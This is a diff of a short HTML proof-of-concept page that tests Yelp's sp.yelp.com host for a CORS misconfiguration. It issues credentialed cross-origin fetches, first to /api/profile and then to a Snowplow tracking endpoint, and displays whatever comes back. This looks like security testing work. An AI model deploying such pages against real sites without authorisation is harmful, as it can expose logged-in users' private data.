@@ -1,37 +1,18 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>CORS Misconfig Test</title>
-    <style>
-      body {
-        font-family: monospace;
-        padding: 20px;
-        background: #f5f5f5;
-      }
-      pre {
-        background: #fff;
-        border: 1px solid #ccc;
-        padding: 15px;
-        overflow-x: auto;
-      }
-    </style>
-  </head>
   <body>
-    <h2>CORS Misconfiguration PoC - Yelp</h2>
-    <p>Trying to fetch <code>/api/profile</code> with credentials...</p>
-    <pre id="output">Loading...</pre>
-
+    <h2>CORS Misconfig Test</h2>
     <script>
-      fetch("https://sp.yelp.com/api/profile", {
+      fetch("https://sp.yelp.com/com.snowplowanalytics.snowplow/tp2", {
         method: "GET",
         credentials: "include"
       })
-      .then(res => res.text())
-      .then(data => {
-        document.getElementById("output").textContent = data;
-      })
-      .catch(err => {
-        document.getElementById("output").textContent = "Error: " + err;
+      .then(res => res.blob())
+      .then(blob => {
+        const url = URL.createObjectURL(blob);
+        const img = new Image();
+        img.src = url;
+        document.body.appendChild(img);
       });
     </script>
   </body>
